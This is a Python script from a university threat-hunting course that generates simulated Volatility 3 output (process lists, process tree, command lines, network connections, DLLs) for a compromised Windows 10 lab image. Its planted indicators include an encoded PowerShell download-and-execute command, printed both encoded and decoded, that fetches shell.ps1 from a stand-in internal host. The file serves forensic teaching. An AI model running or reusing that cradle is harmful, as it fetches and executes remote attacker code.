#!/usr/bin/env python3
"""
generate_memory_dataset.py
==========================
Genera un dataset JSON que simula la salida de Volatility 3 para un
memory dump de Windows 10 comprometido.

Incluye:
- Procesos legítimos de Windows con relaciones padre-hijo correctas
- 3 procesos maliciosos con diferentes técnicas de evasión:
  1. Masquerading: "scvhost.exe" (nombre similar a svchost)
  2. Wrong parent: "lsass.exe" con parent cmd.exe (debería ser wininit)
  3. Wrong path: "svchost.exe" ejecutándose desde C:\\Temp\\

Curso MAR404 - Cacería de Amenazas - Clase 5
Universidad Mayor 2026
"""

import json
import os
import random
from datetime import datetime, timedelta

OUTPUT_DIR = "/data"


def generate_processes():
    """Genera la lista de procesos (legítimos + maliciosos)."""
    boot_time = datetime(2025, 3, 15, 8, 0, 0)
    
    processes = [
        # Procesos del sistema (legítimos)
        {
            "pid": 4,
            "ppid": 0,
            "name": "System",
            "path": "N/A",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "",
            "sessions": 0,
            "threads": 180,
            "handles": 2500,
            "is_malicious": False,
            "notes": "Kernel process - siempre PID 4"
        },
        {
            "pid": 348,
            "ppid": 4,
            "name": "smss.exe",
            "path": "C:\\Windows\\System32\\smss.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "\\SystemRoot\\System32\\smss.exe",
            "sessions": 0,
            "threads": 2,
            "handles": 30,
            "is_malicious": False,
            "notes": "Session Manager - parent siempre System(4)"
        },
        {
            "pid": 456,
            "ppid": 348,
            "name": "csrss.exe",
            "path": "C:\\Windows\\System32\\csrss.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows",
            "sessions": 0,
            "threads": 12,
            "handles": 500,
            "is_malicious": False,
            "notes": "Client/Server Runtime - Session 0"
        },
        {
            "pid": 508,
            "ppid": 348,
            "name": "csrss.exe",
            "path": "C:\\Windows\\System32\\csrss.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows",
            "sessions": 1,
            "threads": 14,
            "handles": 450,
            "is_malicious": False,
            "notes": "Client/Server Runtime - Session 1"
        },
        {
            "pid": 520,
            "ppid": 348,
            "name": "wininit.exe",
            "path": "C:\\Windows\\System32\\wininit.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "wininit.exe",
            "sessions": 0,
            "threads": 3,
            "handles": 80,
            "is_malicious": False,
            "notes": "Windows Initialization - parent smss.exe"
        },
        {
            "pid": 576,
            "ppid": 520,
            "name": "services.exe",
            "path": "C:\\Windows\\System32\\services.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "C:\\Windows\\system32\\services.exe",
            "sessions": 0,
            "threads": 8,
            "handles": 300,
            "is_malicious": False,
            "notes": "Service Control Manager - parent wininit.exe"
        },
        {
            "pid": 584,
            "ppid": 520,
            "name": "lsass.exe",
            "path": "C:\\Windows\\System32\\lsass.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "C:\\Windows\\system32\\lsass.exe",
            "sessions": 0,
            "threads": 10,
            "handles": 800,
            "is_malicious": False,
            "notes": "Local Security Authority - parent wininit.exe, SOLO 1 instancia"
        },
        {
            "pid": 640,
            "ppid": 348,
            "name": "winlogon.exe",
            "path": "C:\\Windows\\System32\\winlogon.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "winlogon.exe",
            "sessions": 1,
            "threads": 5,
            "handles": 200,
            "is_malicious": False,
            "notes": "Windows Logon - Session 1"
        },
        # svchost instances (legítimas)
        {
            "pid": 780,
            "ppid": 576,
            "name": "svchost.exe",
            "path": "C:\\Windows\\System32\\svchost.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
            "sessions": 0,
            "threads": 25,
            "handles": 1200,
            "is_malicious": False,
            "notes": "Service Host - DcomLaunch (legítimo)"
        },
        {
            "pid": 856,
            "ppid": 576,
            "name": "svchost.exe",
            "path": "C:\\Windows\\System32\\svchost.exe",
            "user": "NT AUTHORITY\\NETWORK SERVICE",
            "create_time": boot_time.isoformat(),
            "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
            "sessions": 0,
            "threads": 45,
            "handles": 1800,
            "is_malicious": False,
            "notes": "Service Host - netsvcs (legítimo)"
        },
        {
            "pid": 920,
            "ppid": 576,
            "name": "svchost.exe",
            "path": "C:\\Windows\\System32\\svchost.exe",
            "user": "NT AUTHORITY\\LOCAL SERVICE",
            "create_time": boot_time.isoformat(),
            "cmdline": "C:\\Windows\\system32\\svchost.exe -k LocalService -p",
            "sessions": 0,
            "threads": 15,
            "handles": 600,
            "is_malicious": False,
            "notes": "Service Host - LocalService (legítimo)"
        },
        {
            "pid": 1100,
            "ppid": 576,
            "name": "svchost.exe",
            "path": "C:\\Windows\\System32\\svchost.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": boot_time.isoformat(),
            "cmdline": "C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
            "sessions": 0,
            "threads": 20,
            "handles": 900,
            "is_malicious": False,
            "notes": "Service Host - LocalSystemNetworkRestricted (legítimo)"
        },
        # Explorer y procesos de usuario
        {
            "pid": 2340,
            "ppid": 2300,
            "name": "explorer.exe",
            "path": "C:\\Windows\\explorer.exe",
            "user": "TECHCORP\\admin.user",
            "create_time": (boot_time + timedelta(minutes=2)).isoformat(),
            "cmdline": "C:\\Windows\\Explorer.EXE",
            "sessions": 1,
            "threads": 35,
            "handles": 1500,
            "is_malicious": False,
            "notes": "Windows Explorer - shell del usuario"
        },
        {
            "pid": 3200,
            "ppid": 2340,
            "name": "chrome.exe",
            "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "user": "TECHCORP\\admin.user",
            "create_time": (boot_time + timedelta(minutes=5)).isoformat(),
            "cmdline": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
            "sessions": 1,
            "threads": 30,
            "handles": 400,
            "is_malicious": False,
            "notes": "Google Chrome (legítimo)"
        },
        {
            "pid": 3500,
            "ppid": 2340,
            "name": "notepad.exe",
            "path": "C:\\Windows\\System32\\notepad.exe",
            "user": "TECHCORP\\admin.user",
            "create_time": (boot_time + timedelta(minutes=10)).isoformat(),
            "cmdline": "\"C:\\Windows\\System32\\notepad.exe\" C:\\Users\\admin.user\\Documents\\notes.txt",
            "sessions": 1,
            "threads": 4,
            "handles": 100,
            "is_malicious": False,
            "notes": "Notepad (legítimo)"
        },
        
        # ============ PROCESOS MALICIOSOS ============
        
        # MALICIOSO 1: Masquerading - nombre similar a svchost
        {
            "pid": 6672,
            "ppid": 3200,
            "name": "scvhost.exe",
            "path": "C:\\Users\\admin.user\\AppData\\Local\\Temp\\scvhost.exe",
            "user": "TECHCORP\\admin.user",
            "create_time": (boot_time + timedelta(minutes=45)).isoformat(),
            "cmdline": "C:\\Users\\admin.user\\AppData\\Local\\Temp\\scvhost.exe",
            "sessions": 1,
            "threads": 3,
            "handles": 150,
            "is_malicious": True,
            "technique": "T1036.005 - Match Legitimate Name or Location",
            "indicators": [
                "Nombre 'scvhost' similar a 'svchost' (typosquatting)",
                "Path en AppData\\Local\\Temp (no System32)",
                "Parent es chrome.exe (descarga web)",
                "Usuario no es SYSTEM (svchost siempre es SYSTEM)",
                "No tiene flag -k (svchost siempre tiene -k)"
            ]
        },
        
        # MALICIOSO 2: lsass falso con parent incorrecto
        {
            "pid": 7788,
            "ppid": 4500,
            "name": "lsass.exe",
            "path": "C:\\Windows\\Temp\\lsass.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": (boot_time + timedelta(minutes=50)).isoformat(),
            "cmdline": "C:\\Windows\\Temp\\lsass.exe -dump",
            "sessions": 0,
            "threads": 2,
            "handles": 50,
            "is_malicious": True,
            "technique": "T1003.001 - LSASS Memory / T1036 - Masquerading",
            "indicators": [
                "Segunda instancia de lsass.exe (solo debe haber 1)",
                "Path en C:\\Windows\\Temp (no System32)",
                "Parent PID 4500 (cmd.exe) - debería ser wininit.exe",
                "Argumento '-dump' no es normal para lsass",
                "Creado 50 min después del boot (lsass se crea al boot)"
            ]
        },
        
        # MALICIOSO 3: svchost con path incorrecto y sin -k
        {
            "pid": 8890,
            "ppid": 7788,
            "name": "svchost.exe",
            "path": "C:\\Temp\\svchost.exe",
            "user": "NT AUTHORITY\\SYSTEM",
            "create_time": (boot_time + timedelta(minutes=52)).isoformat(),
            "cmdline": "C:\\Temp\\svchost.exe -c C:\\Temp\\config.dat",
            "sessions": 0,
            "threads": 5,
            "handles": 200,
            "is_malicious": True,
            "technique": "T1036.005 - Match Legitimate Name / T1059 - Command Execution",
            "indicators": [
                "Path en C:\\Temp (no System32)",
                "Parent es lsass.exe falso (PID 7788)",
                "No tiene flag -k (todos los svchost legítimos tienen -k)",
                "Argumento '-c config.dat' no es normal",
                "Parent no es services.exe (576)"
            ]
        },
        
        # Proceso auxiliar para el ataque (cmd.exe usado por atacante)
        {
            "pid": 4500,
            "ppid": 2340,
            "name": "cmd.exe",
            "path": "C:\\Windows\\System32\\cmd.exe",
            "user": "TECHCORP\\admin.user",
            "create_time": (boot_time + timedelta(minutes=48)).isoformat(),
            "cmdline": "cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
            "sessions": 1,
            "threads": 2,
            "handles": 50,
            "is_malicious": True,
            "technique": "T1059.001 - PowerShell / T1059.003 - Windows Command Shell",
            "indicators": [
                "PowerShell con -enc (encoded command)",
                "Descarga desde IP interna sospechosa (192.168.1.100)",
                "Creado justo antes de los procesos maliciosos",
                "El encoded command decodifica a: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
            ]
        },
    ]
    
    return processes


def generate_network_connections():
    """Genera conexiones de red (simula netscan output)."""
    connections = [
        # Conexiones legítimas
        {"pid": 3200, "proto": "TCPv4", "local": "192.168.10.20:49832", "remote": "142.250.80.46:443", "state": "ESTABLISHED", "is_malicious": False},
        {"pid": 3200, "proto": "TCPv4", "local": "192.168.10.20:49833", "remote": "142.250.80.46:443", "state": "ESTABLISHED", "is_malicious": False},
        {"pid": 856, "proto": "TCPv4", "local": "192.168.10.20:49900", "remote": "20.190.159.4:443", "state": "ESTABLISHED", "is_malicious": False},
        {"pid": 780, "proto": "TCPv4", "local": "0.0.0.0:135", "remote": "0.0.0.0:0", "state": "LISTENING", "is_malicious": False},
        {"pid": 920, "proto": "TCPv4", "local": "0.0.0.0:445", "remote": "0.0.0.0:0", "state": "LISTENING", "is_malicious": False},
        
        # Conexiones maliciosas
        {"pid": 6672, "proto": "TCPv4", "local": "192.168.10.20:51234", "remote": "203.0.113.77:4443", "state": "ESTABLISHED", "is_malicious": True,
         "notes": "Conexión C2 - scvhost.exe → IP externa puerto 4443"},
        {"pid": 8890, "proto": "TCPv4", "local": "192.168.10.20:52000", "remote": "203.0.113.77:8080", "state": "ESTABLISHED", "is_malicious": True,
         "notes": "Conexión C2 secundaria - svchost falso → IP externa"},
        {"pid": 7788, "proto": "TCPv4", "local": "192.168.10.20:49999", "remote": "192.168.10.30:445", "state": "ESTABLISHED", "is_malicious": True,
         "notes": "Lateral movement - lsass falso → servidor interno SMB"},
    ]
    
    return connections


def generate_dlls():
    """Genera DLLs cargadas por procesos maliciosos."""
    dlls = {
        6672: [
            {"name": "ntdll.dll", "path": "C:\\Windows\\System32\\ntdll.dll", "suspicious": False},
            {"name": "kernel32.dll", "path": "C:\\Windows\\System32\\kernel32.dll", "suspicious": False},
            {"name": "ws2_32.dll", "path": "C:\\Windows\\System32\\ws2_32.dll", "suspicious": False},
            {"name": "payload.dll", "path": "C:\\Users\\admin.user\\AppData\\Local\\Temp\\payload.dll", "suspicious": True,
             "notes": "DLL no firmada en directorio temporal"},
        ],
        7788: [
            {"name": "ntdll.dll", "path": "C:\\Windows\\System32\\ntdll.dll", "suspicious": False},
            {"name": "kernel32.dll", "path": "C:\\Windows\\System32\\kernel32.dll", "suspicious": False},
            {"name": "dbghelp.dll", "path": "C:\\Windows\\Temp\\dbghelp.dll", "suspicious": True,
             "notes": "dbghelp.dll en Temp - usado para dump de memoria (mimikatz pattern)"},
        ],
    }
    return dlls


def main():
    """Genera todos los datasets del laboratorio."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # Generar procesos
    processes = generate_processes()
    with open(f"{OUTPUT_DIR}/pslist_output.json", "w") as f:
        json.dump(processes, f, indent=2)
    
    # Generar conexiones de red
    connections = generate_network_connections()
    with open(f"{OUTPUT_DIR}/netscan_output.json", "w") as f:
        json.dump(connections, f, indent=2)
    
    # Generar DLLs
    dlls = generate_dlls()
    with open(f"{OUTPUT_DIR}/dlllist_output.json", "w") as f:
        json.dump(dlls, f, indent=2)
    
    # Generar archivo de texto simulando salida de vol3 pslist
    with open(f"{OUTPUT_DIR}/vol3_pslist.txt", "w") as f:
        f.write("Volatility 3 Framework\n")
        f.write("Plugin: windows.pslist.PsList\n\n")
        f.write(f"{'PID':<8}{'PPID':<8}{'ImageFileName':<20}{'CreateTime':<28}{'Threads':<10}{'Handles':<10}{'SessionId':<10}\n")
        f.write("-" * 100 + "\n")
        for p in processes:
            f.write(f"{p['pid']:<8}{p['ppid']:<8}{p['name']:<20}{p['create_time']:<28}{p['threads']:<10}{p['handles']:<10}{p.get('sessions', 0):<10}\n")
    
    # Generar archivo de texto simulando salida de vol3 pstree
    with open(f"{OUTPUT_DIR}/vol3_pstree.txt", "w") as f:
        f.write("Volatility 3 Framework\n")
        f.write("Plugin: windows.pstree.PsTree\n\n")
        f.write(f"{'PID':<8}{'PPID':<8}{'ImageFileName':<25}{'Offset':<18}{'Threads':<8}{'Handles':<8}{'CreateTime'}\n")
        f.write("-" * 110 + "\n")
        
        # Construir árbol simple
        def print_tree(processes, ppid, level=0):
            for p in processes:
                if p['ppid'] == ppid:
                    prefix = "  " * level + ("* " if level > 0 else "")
                    f.write(f"{p['pid']:<8}{p['ppid']:<8}{prefix}{p['name']:<{25-len(prefix)}}{'0x'+format(random.randint(0x800000000000, 0xFFFF00000000), '012x'):<18}{p['threads']:<8}{p['handles']:<8}{p['create_time']}\n")
                    print_tree(processes, p['pid'], level + 1)
        
        print_tree(processes, 0)
    
    # Generar archivo de cmdline
    with open(f"{OUTPUT_DIR}/vol3_cmdline.txt", "w") as f:
        f.write("Volatility 3 Framework\n")
        f.write("Plugin: windows.cmdline.CmdLine\n\n")
        f.write(f"{'PID':<8}{'Process':<20}{'Args'}\n")
        f.write("-" * 100 + "\n")
        for p in processes:
            if p['cmdline']:
                f.write(f"{p['pid']:<8}{p['name']:<20}{p['cmdline']}\n")
    
    # Generar archivo de netscan
    with open(f"{OUTPUT_DIR}/vol3_netscan.txt", "w") as f:
        f.write("Volatility 3 Framework\n")
        f.write("Plugin: windows.netscan.NetScan\n\n")
        f.write(f"{'Proto':<8}{'LocalAddr':<25}{'ForeignAddr':<25}{'State':<15}{'PID':<8}{'Owner'}\n")
        f.write("-" * 100 + "\n")
        for c in connections:
            owner = next((p['name'] for p in processes if p['pid'] == c['pid']), "Unknown")
            f.write(f"{c['proto']:<8}{c['local']:<25}{c['remote']:<25}{c['state']:<15}{c['pid']:<8}{owner}\n")
    
    print(f"[+] Dataset de memoria generado en {OUTPUT_DIR}")
    print(f"[+] Procesos totales: {len(processes)}")
    print(f"[+] Procesos maliciosos: {sum(1 for p in processes if p['is_malicious'])}")
    print(f"[+] Conexiones de red: {len(connections)}")
    print(f"[+] Archivos generados:")
    print(f"    - pslist_output.json (datos estructurados)")
    print(f"    - netscan_output.json (conexiones)")
    print(f"    - dlllist_output.json (DLLs)")
    print(f"    - vol3_pslist.txt (simula salida de Volatility)")
    print(f"    - vol3_pstree.txt (árbol de procesos)")
    print(f"    - vol3_cmdline.txt (líneas de comando)")
    print(f"    - vol3_netscan.txt (conexiones de red)")


if __name__ == "__main__":
    main()
